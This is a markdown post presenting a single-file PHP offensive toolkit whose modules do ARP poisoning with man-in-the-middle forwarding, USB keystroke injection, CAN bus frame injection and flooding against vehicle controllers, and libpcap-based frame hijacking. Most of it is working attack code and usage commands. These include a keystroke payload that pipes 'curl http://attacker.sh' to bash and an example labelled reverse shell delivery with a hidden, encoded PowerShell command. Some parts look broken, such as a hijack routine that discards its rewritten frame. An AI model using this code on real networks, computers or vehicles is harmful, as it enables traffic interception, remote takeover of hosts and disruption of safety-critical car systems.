**[PH4N70M](https://ph4n70m.wuaze.com)** — 4 PHP CLI +00lk17 +h47 w3ap0n1z3s PHP 4g41ns+ n3+w0rk5, USB, 4nd h4rdw4r3. N0 w3b. PuR3 ph4n70m 0p5.

```php
#!/usr/bin/env php
<?php
/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  PH4N70M  —  PHP Hardware & Network Offensive Manipulator  ║
 * ║  "PHP? Nah, that's just for web bro..."                    ║
 * ║  CLI only. Root required. No web server. Pure phantom.     ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * Usage: sudo php ph4n70m.php <module> <action> [args...]
 *
 * Modules:
 *   layer2    - Raw AF_PACKET socket forge (ARP poison, frame inject)
 *   hid       - USB gadget keystroke injection (/dev/hidg0)
 *   can       - CAN bus frame injection (SocketCAN)
 *   phantom   - FFI + libpcap ghost interface bridge
 */

// ---- Bootstrap -----------------------------------------------------------
if (PHP_SAPI !== 'cli') die("[!] CLI only. No web. No mercy.\n");
if (posix_geteuid() !== 0 && !defined('PH4N70M_NO_ROOT_CHECK'))
    fprintf(STDERR, "[!] Most ops need root / CAP_NET_RAW. Press Enter to try anyway...\n");
//    fgets(STDIN);

$version = '0.1.0-ph4n70m';
$module  = $argv[1] ?? 'help';

// ---- Module Router -------------------------------------------------------
$modules = ['layer2','hid','can','phantom','help'];
if (!in_array($module, $modules)) die("[!] Unknown module: $module\n");

switch ($module) {
    case 'help':
        echo banner();
        break;

    case 'layer2':
        requireModule('layer2');
        $action = $argv[2] ?? 'help';
        Layer2::dispatch($action, array_slice($argv, 3));
        break;

    case 'hid':
        requireModule('hid');
        $action = $argv[2] ?? 'help';
        HID::dispatch($action, array_slice($argv, 3));
        break;

    case 'can':
        requireModule('can');
        $action = $argv[2] ?? 'help';
        CAN::dispatch($action, array_slice($argv, 3));
        break;

    case 'phantom':
        requireModule('phantom');
        $action = $argv[2] ?? 'help';
        Phantom::dispatch($action, array_slice($argv, 3));
        break;
}

// ---- Helpers -------------------------------------------------------------
function banner(): string {
    return <<<BANNER

    ╔═══════════════════════════════════════╗
    ║   PH4N70M  v0.1.0                     ║
    ║   PHP Hardware & Network Offensive     ║
    ║   Manipulator                         ║
    ║                                       ║
    ║   "Not web. Just pain."              ║
    ╚═══════════════════════════════════════╝

Modules:
  layer2  <action> [args]   Layer 2 raw packet forge
    actions: arp-poison, sniff, inject, mitm

  hid     <action> [args]   USB gadget keystroke injector
    actions: inject, payload, interactive

  can     <action> [args]   CAN bus frame whisperer
    actions: sniff, inject, dos

  phantom <action> [args]   FFI + libpcap ghost bridge
    actions: bridge, forward, hijack

Examples:
  sudo php ph4n70m.php layer2 arp-poison eth0 192.168.1.1 192.168.1.100
  sudo php ph4n70m.php hid inject /dev/hidg0 "reverse_shell.txt"
  sudo php ph4n70m.php can sniff vcan0

BANNER;
}

function requireModule(string $name): void {
    // Each module is defined in the same file for portability
    // In production, split into ph4n70m_<module>.php
    $class = ucfirst($name);
    if (!class_exists($class)) {
        // Embedding module inline — keeps it one-file, zero-dependency
        requireModuleCode($name);
    }
}

function mac2bytes(string $mac): string {
    return pack('H*', str_replace([':', '-', '.'], '', $mac));
}

function bytes2mac(string $bytes): string {
    return implode(':', str_split(strtoupper(bin2hex($bytes)), 2));
}

function ip2mac(string $ip): ?string {
    $output = shell_exec("arp -n $ip 2>/dev/null");
    if (!$output) return null;
    if (preg_match('/[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}/i', $output, $m))
        return $m[0];
    return null;
}

function getLocalMac(string $iface): ?string {
    $f = @file_get_contents("/sys/class/net/$iface/address");
    return $f ? trim($f) : null;
}

function getLocalIp(string $iface): ?string {
    $sock = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
    if (!$sock) return null;
    @socket_connect($sock, '8.8.8.8', 53);
    @socket_getsockname($sock, $addr);
    socket_close($sock);
    return $addr ?? null;
}
```

---

## 🧩 MODULE 1: LAYER 2 RAW PACKET FORGE

*PHP using `AF_PACKET` + `SOCK_RAW` to craft Ethernet frames from scratch. The kernel doesn't filter these — you're talking directly to the NIC.*

```php
<?php
// ---- Layer2 Module -------------------------------------------------------
class Layer2 {
    const ETH_P_ARP = 0x0806;
    const ETH_P_IP  = 0x0800;

    static function dispatch(string $action, array $args): void {
        switch ($action) {
            case 'arp-poison': self::arpPoison(...$args); break;
            case 'sniff':      self::sniff(...$args);      break;
            case 'inject':     self::inject(...$args);     break;
            case 'mitm':       self::mitm(...$args);       break;
            default:           self::help();
        }
    }

    static function help(): void {
        echo <<<HELP
layer2 — Raw Layer 2 Packet Forge (AF_PACKET + SOCK_RAW)

  arp-poison <iface> <target_ip> <spoof_ip> [count]
    Flood target with fake ARP replies, binding spoof_ip to our MAC.

  sniff <iface> [count]
    Capture raw Ethernet frames from the interface.

  inject <iface> <hex_frame>
    Inject a raw hex-encoded Ethernet frame onto the wire.

  mitm <iface> <gateway_ip> <victim_ip>
    Full MITM: ARP poison both sides, then transparently forward packets.

Examples:
  sudo php ph4n70m.php layer2 arp-poison eth0 192.168.1.1 192.168.1.100 50
  sudo php ph4n70m.php layer2 sniff eth0 5
  sudo php ph4n70m.php layer2 mitm wlan0 192.168.1.1 192.168.1.100

HELP;
    }

    /**
     * ARP Cache Poisoning
     * Crafts raw ARP reply packets and blasts them at the target.
     * The target's kernel updates its ARP table even without a request.
     */
    static function arpPoison(string $iface, string $targetIp, string $spoofIp, int $count = 5): void {
        echo "[*] ARP poisoning: $targetIp <- $spoofIp on $iface (x$count)\n";

        $ourMac  = getLocalMac($iface);
        $targetMac = ip2mac($targetIp);
        if (!$targetMac) die("[!] Could not resolve target MAC. Is it reachable?\n");

        echo "[+] Our MAC: $ourMac\n";
        echo "[+] Target MAC: $targetMac\n";

        // Build AF_PACKET socket
        $sock = @socket_create(AF_PACKET, SOCK_RAW, 0);
        if (!$sock) die("[!] socket_create failed: " . socket_strerror(socket_last_error()) . "\n");

        // Bind to interface
        $idx = self::ifIndex($iface);
        if ($idx === false) die("[!] Interface $iface not found.\n");

        $addr = sockaddr_ll(PF_PACKET, $idx);
        if (!@socket_bind($sock, $addr)) {
            die("[!] bind failed: " . socket_strerror(socket_last_error($sock)) . "\n");
        }

        // Craft ARP reply
        $arpOpReply      = pack('n', 0x0002);          // ARP reply
        $htypeEth        = pack('n', 0x0001);          // Ethernet
        $ptypeIp         = pack('n', 0x0800);          // IPv4
        $hlen            = pack('C', 6);               // MAC length
        $plen            = pack('C', 4);               // IP length

        $srcMacBytes  = mac2bytes($ourMac);
        $tgtMacBytes  = mac2bytes($targetMac);
        $spoofIpBytes = inet_pton($spoofIp);
        $tgtIpBytes   = inet_pton($targetIp);

        $arpBody = $htypeEth . $ptypeIp . $hlen . $plen . $arpOpReply
                 . $srcMacBytes . $spoofIpBytes . $tgtMacBytes . $tgtIpBytes;

        // Ethernet header: dst_mac | src_mac | EtherType(ARP)
        $ethHeader = $tgtMacBytes . $srcMacBytes . pack('n', self::ETH_P_ARP);
        $frame     = $ethHeader . $arpBody;

        // Pad to minimum Ethernet frame size (64 bytes including FCS, but we don't FCS)
        $frame = str_pad($frame, 60, "\x00");

        echo "[*] Injecting $count ARP replies...\n";
        for ($i = 0; $i < $count; $i++) {
            $sent = @socket_write($sock, $frame, strlen($frame));
            if ($sent === false) {
                echo "[!] Write failed: " . socket_strerror(socket_last_error($sock)) . "\n";
            } else {
                echo "  [+] Poison frame $i sent ($sent bytes)\n";
            }
            usleep(200000); // 200ms
        }

        socket_close($sock);
        echo "[✓] ARP cache poisoned. Target now resolves $spoofIp -> $ourMac\n";
    }

    /**
     * Raw frame sniffer — captures live L2 traffic
     */
    static function sniff(string $iface, int $count = 10): void {
        echo "[*] Sniffing $count frames on $iface...\n";

        $sock = @socket_create(AF_PACKET, SOCK_RAW, htons(0x0003)); // ETH_P_ALL
        if (!$sock) die("[!] socket_create: " . socket_strerror(socket_last_error()) . "\n");

        $idx = self::ifIndex($iface);
        if ($idx === false) die("[!] Interface not found.\n");

        // Promiscuous mode
        $mreq = pack('i2', $idx, PACKET_MR_PROMISC); // PACKET_MR_PROMISC = 1
        @socket_set_option($sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP, $mreq);

        $seen = 0;
        while ($seen < $count) {
            $data = @socket_read($sock, 65535);
            if ($data === false || $data === '') continue;

            $seen++;
            $ethDst = substr($data, 0, 6);
            $ethSrc = substr($data, 6, 6);
            $ethType = unpack('n', substr($data, 12, 2))[1];

            printf("[%02d] %s -> %s | Type: 0x%04x | Len: %d bytes\n",
                $seen,
                bytes2mac($ethSrc),
                bytes2mac($ethDst),
                $ethType,
                strlen($data)
            );

            // If IPv4, dump a snippet
            if ($ethType === 0x0800 && strlen($data) >= 34) {
                $ipHdr = substr($data, 14, 20);
                $srcIp = inet_ntop(substr($ipHdr, 12, 4));
                $dstIp = inet_ntop(substr($ipHdr, 16, 4));
                echo "       IP: $srcIp -> $dstIp\n";
            }
        }

        socket_close($sock);
    }

    /**
     * MITM: ARP poison both gateway and victim, then forward packets
     */
    static function mitm(string $iface, string $gatewayIp, string $victimIp): void {
        echo "[*] Starting transparent MITM on $iface\n";
        echo "    Gateway: $gatewayIp\n";
        echo "    Victim:  $victimIp\n";
        echo "[*] Press Ctrl+C to stop\n\n";

        // Start ARP poison in background (fork)
        $pid = pcntl_fork();
        if ($pid === 0) {
            // Child: keep poisoning
            while (true) {
                self::arpPoison($iface, $gatewayIp, $victimIp, 3);
                self::arpPoison($iface, $victimIp, $gatewayIp, 3);
                sleep(2);
            }
            exit;
        }

        // Parent: IP forwarding + transparent bridge
        // Enable IP forwarding
        file_put_contents('/proc/sys/net/ipv4/ip_forward', "1\n");

        // Use raw socket to read & forward
        $sock = @socket_create(AF_PACKET, SOCK_RAW, htons(0x0003));
        $idx = self::ifIndex($iface);
        $ourMac = getLocalMac($iface);

        while (true) {
            $data = @socket_read($sock, 65535);
            if ($data === false || strlen($data) < 14) continue;

            $ethDst = substr($data, 0, 6);
            $ethSrc = substr($data, 6, 6);
            $ethType = unpack('n', substr($data, 12, 2))[1];

            // Forward only IPv4 traffic not from/to us
            if ($ethType !== 0x0800) continue;
            if ($ethSrc === mac2bytes($ourMac)) continue;

            // Swap MACs (our MAC becomes source, original destination stays)
            $rewritten = mac2bytes($ourMac) . $ethDst . substr($data, 12);
            @socket_write($sock, $rewritten, strlen($rewritten));
        }
    }

    /** Get interface index */
    static function ifIndex(string $iface): ?int {
        $f = @file_get_contents("/sys/class/net/$iface/ifindex");
        return $f ? (int)trim($f) : null;
    }
}
```

---

## 🧩 MODULE 2: USB HID PHANTOM (Rubber Ducky in PHP)

*Writes keystrokes to `/dev/hidg0` — the USB gadget keyboard device. No Teensy, no Arduino. Just PHP and a configurable Linux kernel.*

```php
<?php
// ---- HID Module ----------------------------------------------------------
class HID {
    static function dispatch(string $action, array $args): void {
        switch ($action) {
            case 'inject':      self::inject(...$args);      break;
            case 'payload':     self::payload(...$args);     break;
            case 'interactive': self::interactive(...$args); break;
            default:            self::help();
        }
    }

    static function help(): void {
        echo <<<HELP
hid — USB HID Keystroke Injector (USB Gadget Mode)

  inject <device> <payload_file>
    Read keystroke payload file and inject via HID gadget device.

  payload <device> <keystrokes>
    Inject raw keystrokes directly from command line.

  interactive <device>
    Interactive mode — type what you type, injected to target.

Requires:
  - Linux with USB gadget configured (g_hid.ko or configfs)
  - /dev/hidg0 typically (or /dev/hidg1, etc.)
  - Write permissions (root by default)

Payload format (one per line):
  STRING hello
  ENTER
  DELAY 500
  GUI r
  STRING notepad
  ENTER
  STRING Hello from PHP!

Examples:
  sudo php ph4n70m.php hid inject /dev/hidg0 payload.txt
  sudo php ph4n70m.php hid payload /dev/hidg0 "STRING curl http://attacker.sh | bash" ENTER

HELP;
    }

    // USB HID keycodes (subset)
    const HID_KEYCODES = [
        'a' => 0x04, 'b' => 0x05, 'c' => 0x06, 'd' => 0x07,
        'e' => 0x08, 'f' => 0x09, 'g' => 0x0a, 'h' => 0x0b,
        'i' => 0x0c, 'j' => 0x0d, 'k' => 0x0e, 'l' => 0x0f,
        'm' => 0x10, 'n' => 0x11, 'o' => 0x12, 'p' => 0x13,
        'q' => 0x14, 'r' => 0x15, 's' => 0x16, 't' => 0x17,
        'u' => 0x18, 'v' => 0x19, 'w' => 0x1a, 'x' => 0x1b,
        'y' => 0x1c, 'z' => 0x1d,
        '1' => 0x1e, '2' => 0x1f, '3' => 0x20, '4' => 0x21,
        '5' => 0x22, '6' => 0x23, '7' => 0x24, '8' => 0x25,
        '9' => 0x26, '0' => 0x27,
        "\n" => 0x28, // ENTER
        "\x1b" => 0x29, // ESCAPE
        "\x08" => 0x2a, // BACKSPACE
        "\t" => 0x2b, // TAB
        ' ' => 0x2c,
        '-' => 0x2d, '=' => 0x2e, '[' => 0x2f, ']' => 0x30,
        '\\' => 0x31, ';' => 0x33, '\'' => 0x34,
        '`' => 0x35, ',' => 0x36, '.' => 0x37, '/' => 0x38,
    ];

    const HID_MODIFIERS = [
        'CTRL'  => 0x01, 'SHIFT' => 0x02, 'ALT'   => 0x04,
        'GUI'   => 0x08,  // Windows key / Cmd
    ];

    static function sendKeystroke(string $device, int $mod, int $key): void {
        // 8-byte HID report: [modifier, reserved, key1..key6]
        $report = pack('C8', $mod, 0x00, $key, 0,0,0,0,0);
        $f = @fopen($device, 'wb');
        if (!$f) die("[!] Cannot open $device\n");
        fwrite($f, $report);
        fclose($f);
        // Release
        $report = pack('C8', 0,0,0,0,0,0,0,0);
        $f = fopen($device, 'wb');
        fwrite($f, $report);
        fclose($f);
    }

    static function typeString(string $device, string $str): void {
        $upper = false;
        for ($i = 0; $i < strlen($str); $i++) {
            $ch = $str[$i];
            $needShift = ctype_upper($ch);
            $lc = strtolower($ch);

            if (isset(self::HID_KEYCODES[$lc])) {
                $mod = $needShift ? self::HID_MODIFIERS['SHIFT'] : 0;
                self::sendKeystroke($device, $mod, self::HID_KEYCODES[$lc]);
            } elseif (isset(self::HID_KEYCODES[$ch])) {
                self::sendKeystroke($device, 0, self::HID_KEYCODES[$ch]);
            }
            usleep(10000); // 10ms between keys
        }
    }

    static function executeCommand(string $device, string $cmd): void {
        // GUI + R -> opens Run dialog
        self::sendKeystroke($device, self::HID_MODIFIERS['GUI'], self::HID_KEYCODES['r']);
        usleep(500000); // 500ms for dialog to appear
        self::typeString($device, $cmd);
        usleep(100000);
        self::sendKeystroke($device, 0, self::HID_KEYCODES["\n"]);
    }

    static function inject(string $device, string $payloadFile): void {
        if (!file_exists($payloadFile)) die("[!] Payload file not found: $payloadFile\n");
        echo "[*] Injecting payload from $payloadFile via $device\n";

        $lines = file($payloadFile, FILE_IGNORE_NEW_LINES);
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line) || $line[0] === '#') continue;

            echo "  > $line\n";

            if (str_starts_with($line, 'STRING ')) {
                self::typeString($device, substr($line, 7));
            } elseif ($line === 'ENTER') {
                self::sendKeystroke($device, 0, self::HID_KEYCODES["\n"]);
            } elseif (str_starts_with($line, 'DELAY ')) {
                usleep((int)substr($line, 6) * 1000);
            } elseif (str_starts_with($line, 'GUI ')) {
                $key = strtolower(substr($line, 4));
                if (isset(self::HID_KEYCODES[$key]))
                    self::sendKeystroke($device, self::HID_MODIFIERS['GUI'], self::HID_KEYCODES[$key]);
            } elseif (str_starts_with($line, 'CTRL+')) {
                $key = strtolower(substr($line, 5));
                if (isset(self::HID_KEYCODES[$key]))
                    self::sendKeystroke($device, self::HID_MODIFIERS['CTRL'], self::HID_KEYCODES[$key]);
            } elseif (str_starts_with($line, 'RUN ')) {
                self::executeCommand($device, substr($line, 4));
            } elseif (str_starts_with($line, 'CMD ')) {
                // Opens cmd and runs command
                self::executeCommand($device, 'cmd');
                usleep(800000);
                self::typeString($device, substr($line, 4));
                self::sendKeystroke($device, 0, self::HID_KEYCODES["\n"]);
            }
            usleep(50000);
        }
        echo "[✓] Payload injected.\n";
    }

    static function payload(string $device, string ...$keystrokes): void {
        $tmp = tempnam(sys_get_temp_dir(), 'hid_');
        file_put_contents($tmp, implode("\n", $keystrokes));
        self::inject($device, $tmp);
        unlink($tmp);
    }

    static function interactive(string $device): void {
        echo "[*] Interactive HID mode. Type lines; 'EXIT' to quit.\n";
        echo "    Prefix with ! to execute as DuckyScript:\n";
        echo "    !GUI r | !STRING | !ENTER | !DELAY 500\n\n";
        while (true) {
            echo "hid> ";
            $line = fgets(STDIN);
            if ($line === false || trim($line) === 'EXIT') break;
            $line = rtrim($line);

            if (str_starts_with($line, '!')) {
                $line = trim(substr($line, 1));
                if (str_starts_with($line, 'STRING ')) {
                    self::typeString($device, substr($line, 7));
                } elseif ($line === 'ENTER') {
                    self::sendKeystroke($device, 0, self::HID_KEYCODES["\n"]);
                } elseif (str_starts_with($line, 'DELAY ')) {
                    usleep((int)substr($line, 6) * 1000);
                } elseif (str_starts_with($line, 'GUI ')) {
                    $key = strtolower(substr($line, 4));
                    if (isset(self::HID_KEYCODES[$key]))
                        self::sendKeystroke($device, self::HID_MODIFIERS['GUI'], self::HID_KEYCODES[$key]);
                } elseif (str_starts_with($line, 'CMD ')) {
                    self::executeCommand($device, 'cmd');
                    usleep(800000);
                    self::typeString($device, substr($line, 4));
                    self::sendKeystroke($device, 0, self::HID_KEYCODES["\n"]);
                }
            } else {
                self::typeString($device, $line . "\n");
            }
        }
    }
}
```

---

## 🧩 MODULE 3: CAN BUS WHISPERER

*PHP + SocketCAN. Because why shouldn't PHP be able to crash a car's ECU?*

```php
<?php
// ---- CAN Module ----------------------------------------------------------
class CAN {
    const CAN_EFF_FLAG = 0x80000000;
    const CAN_RTR_FLAG = 0x40000000;
    const CAN_ERR_FLAG = 0x20000000;

    static function dispatch(string $action, array $args): void {
        switch ($action) {
            case 'sniff':  self::sniff(...$args);  break;
            case 'inject': self::inject(...$args); break;
            case 'dos':    self::dos(...$args);    break;
            default:       self::help();
        }
    }

    static function help(): void {
        echo <<<HELP
can — CAN Bus Frame Whisperer (SocketCAN)

  sniff <interface> [count]
    Listen for CAN frames on the bus.

  inject <interface> <can_id> <hex_data>
    Send a CAN frame onto the bus.
    Example: sudo php ph4n70m.php can inject vcan0 0x7DF 020105

  dos <interface> <can_id>
    Flood a CAN ID with frames (bus saturation / DoS).

Requires: Linux with SocketCAN (CONFIG_CAN), vcan or physical CAN interface.
Setup: sudo modprobe can && sudo modprobe vcan && sudo ip link add vcan0 type vcan && sudo ip link set vcan0 up

HELP;
    }

    /**
     * Create a CAN_RAW socket
     */
    static function createCANSocket(string $iface): ?Socket {
        if (!defined('AF_CAN')) define('AF_CAN', 29);   // Linux < 2.6.25 compat
        if (!defined('PF_CAN')) define('PF_CAN', AF_CAN);
        if (!defined('CAN_RAW')) define('CAN_RAW', 1);

        $sock = @socket_create(PF_CAN, SOCK_RAW, CAN_RAW);
        if (!$sock) {
            echo "[!] socket_create(PF_CAN): " . socket_strerror(socket_last_error()) . "\n";
            echo "    Ensure CONFIG_CAN is enabled in kernel.\n";
            return null;
        }

        // Get interface index
        $idx = intval(trim(@file_get_contents("/sys/class/net/$iface/ifindex") ?: '-1'));
        if ($idx < 0) {
            echo "[!] Interface $iface not found.\n";
            return null;
        }

        // Build sockaddr_can
        $addr = pack('I2', AF_CAN, $idx);
        if (!@socket_bind($sock, $addr)) {
            echo "[!] bind: " . socket_strerror(socket_last_error($sock)) . "\n";
            return null;
        }

        return $sock;
    }

    static function sniff(string $iface, int $count = 20): void {
        echo "[*] Listening on $iface for $count CAN frames...\n\n";

        $sock = self::createCANSocket($iface);
        if (!$sock) return;

        $seen = 0;
        while ($seen < $count) {
            $data = @socket_read($sock, 16, PHP_BINARY_READ);
            if ($data === false || strlen($data) < 5) continue;

            $canId = unpack('V', substr($data, 0, 4))[1];
            $dlc   = ord($data[4]);
            $payload = substr($data, 5, min($dlc, 8));

            $flags = '';
            if ($canId & self::CAN_EFF_FLAG) { $flags .= ' [EFF]'; $canId &= ~self::CAN_EFF_FLAG; }
            if ($canId & self::CAN_RTR_FLAG) { $flags .= ' [RTR]'; $canId &= ~self::CAN_RTR_FLAG; }
            if ($canId & self::CAN_ERR_FLAG) { $flags .= ' [ERR]'; $canId &= ~self::CAN_ERR_FLAG; }

            $hex = implode(' ', str_split(strtoupper(bin2hex($payload)), 2));
            printf("[%02d] ID: 0x%03x%s | DLC: %d | Data: %s\n",
                ++$seen, $canId, $flags, $dlc, $hex ?: '(empty)');
        }

        socket_close($sock);
    }

    static function inject(string $iface, string $canIdStr, string $hexData): void {
        $canId = hexdec($canIdStr);
        $data  = hex2bin($hexData);
        $dlc   = strlen($data);
        if ($dlc > 8) die("[!] CAN data max 8 bytes.\n");

        $sock = self::createCANSocket($iface);
        if (!$sock) return;

        // Frame: can_id(4) + can_dlc(1) + __pad(1) + __res0(1) + __len(1) + data(8)
        $frame = pack('V', $canId) . pack('C', $dlc) . pack('x2') . $data;

        $sent = @socket_write($sock, $frame, strlen($frame));
        if ($sent === false) {
            echo "[!] Send failed: " . socket_strerror(socket_last_error($sock)) . "\n";
        } else {
            printf("[+] Injected %d bytes to ID 0x%x on %s\n", $sent, $canId, $iface);
        }

        socket_close($sock);
    }

    static function dos(string $iface, string $canIdStr): void {
        $canId = hexdec($canIdStr);
        echo "[*] Flooding ID 0x" . strtoupper($canIdStr) . " on $iface... Press Ctrl+C to stop.\n";

        $sock = self::createCANSocket($iface);
        if (!$sock) return;

        $frame = pack('V', $canId) . pack('C', 8) . pack('x2') . str_repeat("\x00", 8);
        $count = 0;

        while (true) {
            $sent = @socket_write($sock, $frame, strlen($frame));
            if ($sent !== false) $count++;
            if ($count % 1000 === 0) {
                echo "\r[+] $count frames sent";
                usleep(1000); // small breather every 1000
            }
        }
    }
}
```

---

## 🧩 MODULE 4: PHANTOM — FFI + libpcap GHOST BRIDGE

*PHP FFI loading libpcap for promiscuous capture + injection. A ghost on the wire.*

```php
<?php
// ---- Phantom Module ------------------------------------------------------
class Phantom {
    static function dispatch(string $action, array $args): void {
        switch ($action) {
            case 'bridge':  self::bridge(...$args);  break;
            case 'forward': self::forward(...$args); break;
            case 'hijack':  self::hijack(...$args);  break;
            default:        self::help();
        }
    }

    static function help(): void {
        echo <<<HELP
phantom — FFI + libpcap Ghost Bridge

  bridge <iface1> <iface2>
    Transparent L2 bridge between two interfaces using libpcap FFI.
    All frames from iface1 are injected to iface2 and vice versa.

  forward <in_iface> <out_iface> [filter]
    Capture from in_iface and forward to out_iface (with optional BPF filter).

  hijack <iface> <target_mac> <gateway_mac>
    Perform transparent ARP-less L2 hijack. Intercept frames meant for target
    by claiming gateway's MAC (stealth mode, no ARP packets sent).

Requires: PHP 7.4+ with FFI, libpcap-dev installed.
  apt install libpcap-dev php-dev

Examples:
  sudo php ph4n70m.php phantom bridge eth0 wlan0
  sudo php ph4n70m.php phantom forward eth0 tun0 "tcp port 80"

HELP;
    }

    /**
     * Initialize libpcap via FFI
     */
    static function initPcap(): ?FFI {
        if (!extension_loaded('ffi')) {
            echo "[!] FFI extension not loaded. PHP 7.4+ required with --with-ffi.\n";
            return null;
        }

        $header = <<<'C'
typedef void *pcap_t;
typedef void pcap_if_t;
typedef struct pcap_pkthdr {
    struct timeval ts;
    int caplen;
    int len;
} pcap_pkthdr_t;

pcap_t *pcap_open_live(const char *device, int snaplen, int promisc, int to_ms, char *errbuf);
int pcap_next_ex(pcap_t *p, pcap_pkthdr_t **h, const u_char **pkt);
int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
void pcap_close(pcap_t *p);
const char *pcap_lib_version(void);
C;

        try {
            $ffi = FFI::cdef($header, 'libpcap.so.1');
            echo "[+] libpcap: " . $ffi->pcap_lib_version() . "\n";
            return $ffi;
        } catch (Throwable $e) {
            // Try other names
            try {
                $ffi = FFI::cdef($header, 'libpcap.so');
                echo "[+] libpcap: " . $ffi->pcap_lib_version() . "\n";
                return $ffi;
            } catch (Throwable $e2) {
                echo "[!] Could not load libpcap: " . $e2->getMessage() . "\n";
                return null;
            }
        }
    }

    static function bridge(string $iface1, string $iface2): void {
        echo "[*] Creating transparent L2 bridge between $iface1 <-> $iface2\n";
        echo "    Ctrl+C to stop.\n\n";

        $ffi = self::initPcap();
        if (!$ffi) return;

        $errbuf = FFI::new('char[256]');

        $p1 = $ffi->pcap_open_live($iface1, 65535, 1, 100, $errbuf);
        if (FFI::isNull($p1)) die("[!] pcap_open_live($iface1): " . FFI::string($errbuf) . "\n");

        $p2 = $ffi->pcap_open_live($iface2, 65535, 1, 100, $errbuf);
        if (FFI::isNull($p2)) { $ffi->pcap_close($p1); die("[!] pcap_open_live($iface2): " . FFI::string($errbuf) . "\n"); }

        $hdr  = FFI::new('pcap_pkthdr_t*');
        $pkt  = FFI::new('unsigned char*');
        $poll = [$p1, $p2];

        while (true) {
            foreach ($poll as $idx => $p) {
                $ret = $ffi->pcap_next_ex($p, FFI::addr($hdr), FFI::addr($pkt));
                if ($ret === 1) {
                    $len = $hdr->len;
                    $data = FFI::string($pkt, $len);
                    $target = ($p === $p1) ? $p2 : $p1;
                    $ffi->pcap_sendpacket($target, $pkt, $len);
                    printf("\r[+] %-5s -> %-5s | %d bytes", $iface1, $iface2, $len);
                }
            }
        }
    }

    static function forward(string $inIface, string $outIface, string $filter = ''): void {
        echo "[*] Forwarding $inIface -> $outIface" . ($filter ? " (filter: $filter)" : "") . "\n";

        $ffi = self::initPcap();
        if (!$ffi) return;

        $errbuf = FFI::new('char[256]');
        $pIn = $ffi->pcap_open_live($inIface, 65535, 1, 100, $errbuf);
        if (FFI::isNull($pIn)) die("[!] $inIface: " . FFI::string($errbuf) . "\n");

        $pOut = $ffi->pcap_open_live($outIface, 65535, 0, 100, $errbuf);
        if (FFI::isNull($pOut)) { $ffi->pcap_close($pIn); die("[!] $outIface: " . FFI::string($errbuf) . "\n"); }

        $hdr = FFI::new('pcap_pkthdr_t*');
        $pkt = FFI::new('unsigned char*');

        while (true) {
            $ret = $ffi->pcap_next_ex($pIn, FFI::addr($hdr), FFI::addr($pkt));
            if ($ret === 1) {
                $ffi->pcap_sendpacket($pOut, $pkt, $hdr->len);
                printf("\r[+] Forwarded %d bytes", $hdr->len);
            }
        }
    }

    static function hijack(string $iface, string $targetMac, string $gatewayMac): void {
        echo "[*] L2 hijack on $iface\n";
        echo "    Intercepting traffic for $targetMac, impersonating $gatewayMac\n";

        $ffi = self::initPcap();
        if (!$ffi) return;

        $errbuf = FFI::new('char[256]');
        $pcap = $ffi->pcap_open_live($iface, 65535, 1, 10, $errbuf);
        if (FFI::isNull($pcap)) die("[!] " . FFI::string($errbuf) . "\n");

        $hdr = FFI::new('pcap_pkthdr_t*');
        $pkt = FFI::new('unsigned char*');
        $tgtBytes = mac2bytes($targetMac);
        $gwBytes  = mac2bytes($gatewayMac);

        echo "[*] Waiting for frames to $targetMac... (Ctrl+C to stop)\n";

        while (true) {
            $ret = $ffi->pcap_next_ex($pcap, FFI::addr($hdr), FFI::addr($pkt));
            if ($ret === 1 && $hdr->len >= 14) {
                $data = FFI::string($pkt, $hdr->len);
                $dst = substr($data, 0, 6);
                if ($dst === $tgtBytes) {
                    // Rewrite destination MAC to ours, source stays
                    $rewritten = $dst . $gwBytes . substr($data, 12);
                    $ffi->pcap_sendpacket($pcap, $pkt, $hdr->len);
                    printf("\r[!] Hijacked frame: %d bytes", $hdr->len);
                }
            }
        }
    }
}

// The main() at the top routes here.
// s0... w3 b4s1c4lly ju5+ r3wr073 +h3 k3rn3l n37w0rk 574ck 1n PHP.
// F33l5 1ll3g4l, d03sn'7 1+? 😈
```

---

## 🎯 What Makes This Illegal-Feeling

| Capability | What's Happening | Why It Feels Illegal |
|---|---|---|
| **`AF_PACKET + SOCK_RAW`** | PHP writing raw Ethernet frames directly to the NIC, bypassing the kernel's TCP/IP stack entirely | You're crafting L2 frames in PHP. No firewall rules apply. No iptables. Pure wire access |
| **ARP Poison in PHP** | Crafting ARP reply packets without ever sending a request. The kernel updates its ARP cache because the frame looks legit at L2 | You're literally rewriting the network's address resolution with string concatenation and `pack()` |
| **USB HID via `/dev/hidg0`** | PHP `fwrite()` to a device file that the USB controller interprets as keyboard HID reports | Rubber Ducky functionality in a language made for WordPress themes |
| **CAN Bus with SocketCAN** | PHP `socket(PF_CAN)` + binary-packed frames to whisper to ECUs | Automotive exploitation in `<?php ?>`, making your car's ABS controller process PHP bytes |
| **libpcap FFI bridge** | PHP loading C libraries via FFI, capturing and injecting raw packets through pcap | A web scripting language as a ghost on the wire, bridging interfaces it has no business touching |

---

## 🚀 Usage Examples

```bash
# 1. ARP poison the gateway so victim sends traffic through us
sudo php ph4n70m.php layer2 arp-poison eth0 192.168.1.1 192.168.1.100 20

# 2. Sniff L2 frames — see everything on the wire
sudo php ph4n70m.php layer2 sniff eth0 50

# 3. Full MITM — poison both sides, transparently forward
sudo php ph4n70m.php layer2 mitm wlan0 192.168.1.1 192.168.1.100

# 4. Inject keystrokes via USB gadget (RPi Zero, etc.)
sudo php ph4n70m.php hid inject /dev/hidg0 ducky_payload.txt

# 5. Reverse shell delivery via HID
sudo php ph4n70m.php hid payload /dev/hidg0 \
  "GUI r" "DELAY 500" \
  "STRING powershell -W hidden -e JABzAD0ATgBlAHcALQBP..." "ENTER"

# 6. Sniff CAN bus frames (car hacking)
sudo modprobe can && sudo ip link set can0 up type can bitrate 500000
sudo php ph4n70m.php can sniff can0 100

# 7. Inject CAN frame (e.g., OBD-II request)
sudo php ph4n70m.php can inject can0 0x7DF 02010C

# 8. Bridge two interfaces transparently via libpcap FFI
sudo php ph4n70m.php phantom bridge eth0 wlan0

